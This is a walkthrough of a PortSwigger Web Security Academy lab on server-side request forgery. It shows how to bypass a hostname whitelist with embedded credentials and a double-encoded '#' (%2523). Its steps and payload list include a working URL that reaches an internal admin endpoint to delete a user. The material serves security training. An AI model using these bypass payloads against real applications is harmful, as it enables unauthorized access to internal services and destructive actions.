# Lab: SSRF with whitelist-based input filter

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

**Lab idea:** The stock-check feature applies a whitelist to destinations. This challenge practices considering how URL parsers and validation rules can disagree, and why a whitelist must be applied to the destination the server will actually contact.

## Vulnerability in brief
Server-side request forgery (SSRF) is a vulnerability that lets an attacker influence a server-side application to send a request to an unintended destination. A common cause is a feature that fetches a user-supplied URL or constructs a URL using user-controlled input, such as a stock lookup, analytics service, or other backend integration. Because the request originates from the application server, it may reach local or internal services that are not directly accessible to an external user. The response may be returned to the user, or the request may be blind, with no backend response reflected in the page.

## Solution idea
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a # to the username and observe that the URL is now rejected.
5. Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

## Payloads / key values
- `stockApi`
- `http://127.0.0.1/`
- `http://username@stock.weliketoshop.net/`
- `#`
- `%2523`
- `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

## Official source
- [PortSwigger Academy: Lab: SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
